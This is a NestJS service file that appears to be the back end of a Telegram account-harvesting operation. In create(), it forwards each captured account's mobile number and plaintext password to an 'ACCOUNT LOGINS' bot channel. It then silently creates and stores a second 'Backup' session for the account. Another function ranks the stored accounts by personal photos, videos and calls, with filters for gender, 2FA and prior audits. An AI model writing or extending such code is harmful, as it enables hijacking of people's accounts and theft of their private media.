import { TelegramService } from './../Telegram/Telegram.service';
import {
  BadRequestException,
  Inject,
  Injectable,
  InternalServerErrorException,
  NotFoundException,
  forwardRef,
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model, QueryFilter, Types } from 'mongoose';
import { User, UserDocument } from './schemas/user.schema';
import { SearchUserDto } from './dto/search-user.dto';
import { ClientService } from '../clients/client.service';
import { UpdateUserDto } from './dto/update-user.dto';
import { CreateUserDto } from './dto/create-user.dto';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { BotsService, ChannelCategory } from '../bots';

@Injectable()
export class UsersService {
  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,
    @Inject(forwardRef(() => TelegramService))
    private telegramService: TelegramService,
    @Inject(forwardRef(() => ClientService))
    private clientsService: ClientService,
    private readonly botsService: BotsService
  ) { }

  async create(user: CreateUserDto): Promise<User | undefined> {
    const activeClientSetup = this.telegramService.getActiveClientSetup();
    console.log("New User received - ", user?.mobile);
    console.log("ActiveClientSetup::", activeClientSetup);
    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
      console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId)
      await this.clientsService.updateClientSession(user.session)
    } else {
      await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels
      // await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
      setTimeout(async () => {
        try {
          await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
          // this.telegramService.forwardMediaToBot(user.mobile, null);
          const newSession = await this.telegramService.createNewSession(user.mobile);
          const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
          await newUserBackup.save();
        } catch (error) {
          console.log("Error in creating new session", error);
        }
      }, 3000);
      const newUser = new this.userModel(user);
      return newUser.save();
    }
  }

  async findAll(limit: number = 100, skip: number = 0): Promise<User[]> {
    return this.userModel.find().limit(limit).skip(skip).exec();
  }

  async findOne(tgId: string): Promise<User> {
    const doc = await this.userModel.findOne({ tgId }).exec();
    if (!doc) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return doc.toJSON();
  }

  async update(tgId: string, updateDto: UpdateUserDto): Promise<number> {
    const result = await this.userModel
      .updateMany({ tgId }, { $set: updateDto }, { upsert: true })
      .exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users with tgId ${tgId} not found`);
    }
    return result.modifiedCount;
  }

  async updateByFilter(
    filter: QueryFilter<UserDocument>,
    updateDto: UpdateUserDto,
  ): Promise<number> {
    const result = await this.userModel
      .updateMany(filter, { $set: updateDto }, { upsert: true })
      .exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users matching filter not found`);
    }
    return result.modifiedCount;
  }

  async delete(tgId: string): Promise<void> {
    const result = await this.userModel.deleteOne({ tgId }).exec();
    if (result.deletedCount === 0) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
  }

  async deleteById(userId: string): Promise<void> {
    const result = await this.userModel.deleteOne({ _id: userId }).exec();
    if (result.deletedCount === 0) {
      throw new NotFoundException(`User with id ${userId} not found`);
    }
  }

  async search(filter: SearchUserDto): Promise<User[]> {
    const query: QueryFilter<UserDocument> = { ...filter };

    if (query.firstName) {
      query.firstName = { $regex: new RegExp(query.firstName as string, 'i') };
    }
    if (query.twoFA !== undefined) {
      query.twoFA = String(query.twoFA) === 'true' || String(query.twoFA) === '1';
    }

    return this.userModel.find(query).sort({ updatedAt: -1 }).exec();
  }

  async executeQuery(
    query: QueryFilter<UserDocument>,
    sort?: Record<string, 1 | -1>,
    limit?: number,
    skip?: number,
  ): Promise<User[]> {
    if (!query) {
      throw new BadRequestException('Query is invalid.');
    }

    try {
      const queryExec = this.userModel.find(query).lean();

      if (sort) queryExec.sort(sort);
      if (limit) queryExec.limit(limit);
      if (skip) queryExec.skip(skip);

      return await queryExec.exec();
    } catch (error) {
      throw new InternalServerErrorException(error.message);
    }
  }

  /**
   * Get users with top interaction scores based on saved stats in DB
   * Uses smart filtering with proper weightages for different interaction types
   * Movie count has negative weightage as it indicates less genuine interaction
   * @param options - Filtering and pagination options
   * @returns Paginated list of users sorted by interaction score
   */
  async getTopInteractionUsers(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    minCalls?: number;
    minPhotos?: number;
    minVideos?: number;
    excludeTwoFA?: boolean;
    excludeAudited?: boolean;
    gender?: string;
  }): Promise<{
    users: Array<User & { interactionScore: number }>;
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  }> {
    const {
      page = 1,
      limit = 20,
      minScore = 30,
      minCalls = 0,
      minPhotos = 0,
      minVideos = 0,
      excludeTwoFA = false,
      excludeAudited = true,
      gender
    } = options;

    // Validate pagination
    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100); // Max 100 per page
    const skip = (pageNum - 1) * limitNum;

    // Weightages for interaction scoring
    // Higher weights for own content (user-generated) vs received content
    // Reduced call weightage as requested
    const weights = {
      ownPhoto: 15,           // Photos sent by user (high engagement)
      ownVideo: 18,          // Videos sent by user (very high engagement)
      otherPhoto: 3,         // Photos received (moderate engagement)
      otherVideo: 5,         // Videos received (good engagement)
      totalPhoto: 2,         // Total photos (fallback if own/other not available)
      totalVideo: 3,         // Total videos (fallback if own/other not available)
      incomingCall: 5,       // Incoming calls (reduced from 15)
      outgoingCall: 3,       // Outgoing calls (reduced from 8)
      videoCall: 8,          // Video calls (reduced from 20)
      totalCalls: 1,         // Total calls (fallback)
      msgs: 0,              // Total messages
      movieCount: -5,       // NEGATIVE: Movie count indicates less genuine interaction
    };

    // Build filter query
    const filter: any = {
      expired: { $ne: true },  // Always skip expired docs
    };

    // Exclude 2FA users if requested
    if (excludeTwoFA) {
      filter.twoFA = { $ne: true };
    }

    // Gender filter
    if (gender) {
      filter.gender = gender;
    }

    // Handle both old schema (calls.totalCalls top-level) and legacy array format
    if (minCalls > 0) {
      filter.$or = [
        ...(filter.$or || []),
        { 'calls.totalCalls': { $gte: minCalls } },
      ];
    }

    if (minPhotos > 0) {
      filter.$or = [
        ...(filter.$or || []),
        { photoCount: { $gte: minPhotos } },
        { ownPhotoCount: { $gte: minPhotos } },
        { otherPhotoCount: { $gte: minPhotos } },
      ];
    }

    if (minVideos > 0) {
      filter.$or = [
        ...(filter.$or || []),
        { videoCount: { $gte: minVideos } },
        { ownVideoCount: { $gte: minVideos } },
        { otherVideoCount: { $gte: minVideos } },
      ];
    }

    // Shared pipeline: match, optional session_audits, dedup, scoring, minScore filter
    const scoringStages = [
      { $match: filter },
      ...(excludeAudited
        ? [
            { $lookup: { from: 'session_audits', localField: 'mobile', foreignField: 'mobile', as: 'sessionAudits' } },
            { $match: { sessionAudits: { $size: 0 } } },
            { $project: { sessionAudits: 0 } },
          ]
        : []),
      // Dedup by mobile: keep one doc per mobile (no $sort here to avoid sort memory limit when disk use is disabled)
      { $group: { _id: '$mobile', doc: { $first: '$$ROOT' } } },
      { $replaceRoot: { newRoot: '$doc' } },
      {
        $addFields: {
          photoScore: {
            $add: [
              { $multiply: [{ $ifNull: ['$ownPhotoCount', 0] }, weights.ownPhoto] },
              { $multiply: [{ $ifNull: ['$otherPhotoCount', 0] }, weights.otherPhoto] },
              {
                $cond: {
                  if: { $and: [{ $lte: [{ $ifNull: ['$ownPhotoCount', 0] }, 0] }, { $lte: [{ $ifNull: ['$otherPhotoCount', 0] }, 0] }] },
                  then: { $multiply: [{ $ifNull: ['$photoCount', 0] }, weights.totalPhoto] },
                  else: 0,
                },
              },
            ],
          },
          videoScore: {
            $add: [
              { $multiply: [{ $ifNull: ['$ownVideoCount', 0] }, weights.ownVideo] },
              { $multiply: [{ $ifNull: ['$otherVideoCount', 0] }, weights.otherVideo] },
              {
                $cond: {
                  if: { $and: [{ $lte: [{ $ifNull: ['$ownVideoCount', 0] }, 0] }, { $lte: [{ $ifNull: ['$otherVideoCount', 0] }, 0] }] },
                  then: { $multiply: [{ $ifNull: ['$videoCount', 0] }, weights.totalVideo] },
                  else: 0,
                },
              },
            ],
          },
          callScore: {
            $let: {
              vars: {
                incomingVal: { $ifNull: ['$calls.incoming', 0] },
                outgoingVal: { $ifNull: ['$calls.outgoing', 0] },
                videoVal: { $ifNull: ['$calls.video', 0] },
                totalCallsVal: { $ifNull: ['$calls.totalCalls', 0] },
              },
              in: {
                $add: [
                  { $multiply: ['$$incomingVal', weights.incomingCall] },
                  { $multiply: ['$$outgoingVal', weights.outgoingCall] },
                  { $multiply: ['$$videoVal', weights.videoCall] },
                  {
                    $cond: {
                      if: { $and: [{ $eq: ['$$incomingVal', 0] }, { $eq: ['$$outgoingVal', 0] }, { $gt: ['$$totalCallsVal', 0] }] },
                      then: { $multiply: ['$$totalCallsVal', weights.totalCalls] },
                      else: 0,
                    },
                  },
                ],
              },
            },
          },
          msgScore: { $multiply: [{ $ifNull: ['$msgs', 0] }, weights.msgs] },
          movieScore: { $multiply: [{ $ifNull: ['$movieCount', 0] }, weights.movieCount] },
        },
      },
      {
        $addFields: {
          interactionScore: {
            $round: [{ $add: ['$photoScore', '$videoScore', '$callScore', '$msgScore', '$movieScore'] }, 2],
          },
        },
      },
      { $match: { interactionScore: { $gte: minScore } } },
    ];

    try {
      // Phase 1: total count (no sort = no memory blow-up)
      const countPipeline = [...scoringStages, { $count: 'count' }];
      const countResult = await this.userModel.collection.aggregate(countPipeline, { allowDiskUse: true }).toArray();
      const totalUsers = countResult[0]?.count ?? 0;

      if (totalUsers === 0) {
        return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
      }

      // Phase 2: sort only _id + interactionScore (tiny docs), skip/limit, then fetch full docs
      const pagePipeline = [
        ...scoringStages,
        { $project: { _id: 1, interactionScore: 1 } },
        { $sort: { interactionScore: -1 } },
        { $skip: skip },
        { $limit: limitNum },
      ];
      const pageResult = await this.userModel.collection.aggregate(pagePipeline, { allowDiskUse: true }).toArray() as { _id: unknown; interactionScore: number }[];

      if (pageResult.length === 0) {
        return { users: [], total: totalUsers, page: pageNum, limit: limitNum, totalPages: Math.ceil(totalUsers / limitNum) };
      }

      const idOrder = pageResult.map((r) => r._id) as Types.ObjectId[];
      const idToScore = new Map(pageResult.map((r) => [String(r._id), r.interactionScore]));
      const docs = await this.userModel.find({ _id: { $in: idOrder } } as QueryFilter<UserDocument>).select('-session').lean().exec();
      const docById = new Map(docs.map((d: any) => [String(d._id), d]));
      const users = idOrder.map((id) => {
        const doc = docById.get(String(id));
        if (!doc) return null;
        const { session, ...rest } = doc as Record<string, unknown>;
        return { ...rest, interactionScore: idToScore.get(String(id)) ?? 0 };
      }).filter(Boolean) as Array<User & { interactionScore: number }>;

      const totalPages = Math.ceil(totalUsers / limitNum);
      return { users, total: totalUsers, page: pageNum, limit: limitNum, totalPages };
    } catch (error) {
      console.error('Error in getTopInteractionUsers aggregation:', error);
      throw new InternalServerErrorException(`Failed to fetch top interaction users: ${error.message}`);
    }
  }

}
